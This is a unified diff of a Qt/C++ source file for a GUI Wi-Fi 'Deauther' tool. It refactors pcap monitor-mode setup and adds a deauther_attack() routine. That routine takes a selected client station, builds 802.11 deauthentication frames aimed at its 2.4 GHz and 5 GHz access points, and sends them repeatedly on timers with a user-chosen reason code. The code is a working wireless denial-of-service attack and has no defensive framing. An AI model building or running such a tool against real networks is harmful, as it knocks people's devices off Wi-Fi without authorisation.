@@ -1,5 +1,6 @@
 #include <QScrollBar>
 #include <QStringBuilder>
+#include <QStringListModel>
 #include <QTimer>
 
 
@@ -9,47 +10,28 @@
 #include <NetworkManagerQt/Settings>
 
 #include "deauther.h"
+#include "deauther_p.h"
 #include "ui_deauther.h"
 
 #include "pcap.h"
-#include "network_model.h"
+
 
 Deauther::Deauther(QWidget *parent) :
     QWidget(parent),
     ui(new Ui::Deauther),
-    search_animation_timer (new QTimer (this)),
+    search_animation_t (new QTimer (this)),
+    send_animation_t (new QTimer (this)),
     stylesheets (new CustomStyleSheets)
 {
     ui->setupUi(this);
 
-    setup_network_list();
+    d_ptr->setup_reasons_list(ui);
+    setup_station_view();
 
-    QVector<StationItemRole> roles ({StationItemRole::StationRole,
-                                     StationItemRole::AccessPointRole});
-    station_model = new StationModel(roles);
     iface_model = new IfaceModel();
 
     // create drop down list for network interfaces
     ui->iface_list->setModel(iface_model);
-    ui->station_view->setModel(station_model);
-
-    // Set treeview header font
-    ui->station_view->header()->setFont(QFont("LiberationSans", 18, QFont::Bold));
-
-    // Set treeview header size for scrollbar gutter
-    treeview_stylesheet = stylesheets->
-                          treeview_scrollbar
-                          (
-                              ui->station_view->header()->
-                              sizeHint().height()
-                          );
-
-    // Set treeview scrollbar colors
-    ui->station_view->setStyleSheet (treeview_stylesheet
-                                     % stylesheets->vertical_scrollbar_quirk());
-
-    // install filter to correct horizontal scrollbar quirks
-    ui->station_view->horizontalScrollBar()->installEventFilter(this);
 
 
     // set up toggle for monitor mode (creates a pcap handle)
@@ -61,9 +43,22 @@ Deauther::Deauther(QWidget *parent) :
             this, &Deauther::toggle_monitoring);
 
     // set up packet search icon
-    search_animation_timer->setInterval (1000);
-    connect (search_animation_timer, &QTimer::timeout,
+    search_animation_t->setInterval (1000);
+    connect (search_animation_t, &QTimer::timeout,
              this, [&]() {search_animation(ui->monitor_status);});
+
+
+    // set up attack button
+    ui->packet_sent->setIcon(QIcon(":/icons/actions/32/mail-send_inactive.svg"));
+    ui->monitor_status->setIconSize(QSize(50, 50));
+
+    connect(ui->deauth_attack, &QPushButton::clicked,
+            this, &Deauther::deauther_attack);
+
+    // set packet sent icon
+    send_animation_t->setInterval (500);
+    connect (send_animation_t, &QTimer::timeout,
+             this, [&]() {send_animation(ui->packet_sent);});
 
 
     /* Pseudo Code for Deathor */
@@ -96,25 +91,49 @@ Deauther::Deauther(QWidget *parent) :
         // https://aircrack-ng.net/doku.php?id=airbase-ng
 }
 
+/* Constructor for private functions */
+Deauther::Deauther (DeautherPrivate &dd)
+    : d_ptr (&dd)
+{
+}
+
 Deauther::~Deauther()
 {
     delete ui;
 }
 
 
-void Deauther::setup_network_list (void)
+void Deauther::setup_station_view (void)
 {
-    QVector<ItemRole> roles ({ItemRole::NameRole});
+    QVector<StationItemRole> roles ({StationItemRole::StationRole,
+                                     StationItemRole::AccessPointRole});
 
-    network_model = new NetworkModel (roles);
-    network_model->setWirelessProperties (WirelessProperties::RemoveUnavailableNetworks, true);
-    network_model->start_scan();
+    station_model = new StationModel(roles);
 
-    network_sort = new NetworkSort();
-    network_sort->setSourceModel (network_model);
+    ui->station_view->setModel(station_model);
 
-    ui->network_list->setModel (network_sort);
-    ui->network_list->model()->sort(0, Qt::AscendingOrder);
+    ui->station_view->resizeColumnToContents (station_model->columnCount()-1);
+    ui->station_view->setIndentation (10);
+    //ui->station_view->setIconSize (QSize (36,36));
+    ui->station_view->setColumnWidth (0, 180);
+
+    // Set treeview header font
+    ui->station_view->header()->setFont(QFont("LiberationSans", 18, QFont::Bold));
+
+    // Set treeview header size for scrollbar gutter
+    treeview_stylesheet = stylesheets->
+                          treeview_scrollbar
+                          (
+                              ui->station_view->header()->
+                              sizeHint().height()
+                          );
+
+    // Set treeview scrollbar colors
+    ui->station_view->setStyleSheet (treeview_stylesheet
+                                     % stylesheets->vertical_scrollbar_quirk());
+
+    // install filter to correct horizontal scrollbar quirks
+    ui->station_view->horizontalScrollBar()->installEventFilter(this);
 }
 
 
@@ -127,56 +146,33 @@ void Deauther::toggle_monitoring ()
 
     // create a pcap handle using the selected network interface
     QByteArray iface = ui->iface_list->currentText().toUtf8();
-    QByteArray error_buffer[PCAP_ERRBUF_SIZE];
 
     if (monitoring)
     {
-        iface_handle = pcap_create(iface.data(), error_buffer->data());
-
-        if (iface_handle == NULL)
+        if (!d_ptr->create_monitorIface (iface, this))
         {
-            qWarning() << "pcap_create failed:" << error_buffer->data();
             return;
         }
 
-        // check if iface supports monitoring
-        if (!pcap_can_set_rfmon (iface_handle))
-        {
-            qWarning() << "Monitor mode is not supported for" << iface.data();
-            pcap_close (iface_handle);
-            return;
-        }
+        station_model->start_pcapThread (iface_handle);
 
-        // set handle to monitor mode
-        if (pcap_set_rfmon (iface_handle, 1))
-        {
-            qWarning() << "Setting" << iface.data() << "to monitor mode failed";
-            pcap_close (iface_handle);
-            return;
-        }
-
-        // activate new monitor iface
-        if (pcap_activate (iface_handle))
-        {
-            qWarning() << "Creating monitoring interface for" << iface.data() << "failed";
-            qWarning() << "Do you have permissions?";
-            pcap_close (iface_handle);
-            return;
-        }
-
-        station_model->setIfaceHandle (iface_handle);
+        ui->iface_list->setEnabled(false);
 
         // start packet search icon
-        search_animation_timer->start();
+        search_animation_t->start();
         ui->monitor_status->setIcon (search_active);
         search_animation_state = 1;
     }
     else
     {
+        station_model->stop_pcapThread ();
+
+        ui->iface_list->setEnabled(true);
+
         pcap_close (iface_handle);
 
         // stop packet search icon
-        search_animation_timer->stop();
+        search_animation_t->stop();
         ui->monitor_status->setIcon (search_inactive);
     }
 
@@ -208,6 +204,172 @@ void Deauther::search_animation (QPushButton *button)
     if (search_animation_state > 3)
     {
         search_animation_state = 1;
+    }
+}
+
+void Deauther::send_animation (QPushButton *button)
+{
+    switch (send_animation_state) {
+    case 1:
+        button->setIcon (QIcon (":/icons/actions/32/mail-send_inactive.svg"));
+        break;
+    case 2:
+        button->setIcon (QIcon (":/icons/actions/32/mail-send.svg"));
+        break;
+    default:
+        send_animation_state = 1;
+        break;
+    }
+    ++send_animation_state;
+
+
+    if (send_animation_state > 2)
+    {
+        send_animation_state = 1;
+    }
+}
+
+void Deauther::deauther_attack ()
+{
+    static bool attack_active = false;
+
+    const QIcon send_inactive = QIcon (":/icons/actions/32/mail-send_inactive.svg");
+    const QIcon send_active = QIcon (":/icons/actions/32/mail-send.svg");
+
+    const QIcon search_paused = QIcon (":/icons/actions/24/edit-find-replace_state0.svg");
+
+    static QTimer pcap_send_t1;
+    pcap_send_t1.setInterval (1000);
+
+    static QTimer pcap_send_t2;
+    pcap_send_t2.setInterval (900);
+
+    /* Find current row of station view */
+    QModelIndex index = ui->station_view->currentIndex();
+
+    if (index.row() == -1
+        && !attack_active)
+    {
+        return;
+    }
+
+
+    /* Retrieve selected station */
+    if (!station_mutex.tryLock())
+    {
+        return;
+    }
+
+    StationItem *station_item = static_cast<StationItem*>(index.internalPointer());
+
+    QByteArray stmac = station_item->stmac();
+    ap_info ap = station_item->apInfo();
+
+    station_mutex.unlock();
+
+
+    /* find ap address */
+    bool ap_found = false;
+
+    QByteArray bssid_2;
+    int chan_2;
+    if (!ap.bssid[0].isNull())
+    {
+        bssid_2 = ap.bssid[0];
+
+        ap_found = true;
+    }
+
+    QByteArray bssid_5;
+    int chan_5;
+    if (!ap.bssid[1].isNull())
+    {
+        bssid_5 = ap.bssid[1];
+
+        ap_found = true;
+    }
+
+    if(!ap_found)
+    {
+        return;
+    }
+
+
+    /* create deauth packet */
+    int reason_index = ui->reasons_list->currentIndex();
+    QByteArray reason;
+    reason.append(reason_index+1);
+
+    // 2GHz deauth packet
+    QByteArray packet_2 = d_ptr->create_deauthPacket (stmac, bssid_2, reason);
+
+    // 5GHz deauth packet
+    QByteArray packet_5 = d_ptr->create_deauthPacket (stmac, bssid_5, reason);
+
+
+    /* send deauth packet */
+    int i = 0;
+    if (!attack_active)
+    {
+        qDebug() << "Start Deauther Attack";
+        qDebug() << Qt::endl;
+
+        // stop monitoring to avoid collision
+        station_model->stop_pcapThread ();
+        ui->toggle_monitoring->setEnabled(false);
+
+
+        if (!bssid_2.isNull())
+        {
+            connect (&pcap_send_t1, &QTimer::timeout, this, [&, packet_2]()
+            {
+                d_ptr->send_packet (packet_2, RADIOTAP_SIZE+DEAUTH_SIZE, 64, this);
+            });
+
+            pcap_send_t1.start();
+            attack_active = true;
+        }
+
+        if (!bssid_5.isNull())
+        {
+            connect (&pcap_send_t2, &QTimer::timeout, this, [&, packet_5]()
+            {
+                d_ptr->send_packet (packet_5, RADIOTAP_SIZE+DEAUTH_SIZE, 64, this);
+            });
+
+            pcap_send_t2.start();
+            attack_active = true;
+        }
+
+        if (attack_active)
+        {
+            send_animation_t->start();
+            ui->packet_sent->setIcon (send_active);
+            send_animation_state = 1;
+
+            search_animation_t->stop();
+            ui->monitor_status->setIcon(search_paused);
+        }
+    }
+    else
+    {
+        qDebug() << "Stop Deauther Attack";
+        pcap_send_t1.stop();
+        pcap_send_t2.stop();
+
+        disconnect (&pcap_send_t1);
+        disconnect (&pcap_send_t2);
+
+        station_model->start_pcapThread(iface_handle);
+        ui->toggle_monitoring->setEnabled(true);
+
+        send_animation_t->stop();
+        ui->packet_sent->setIcon (send_inactive);
+
+        search_animation_t->start();
+        search_animation_state = 1;
+
+        attack_active = false;
     }
 }
 
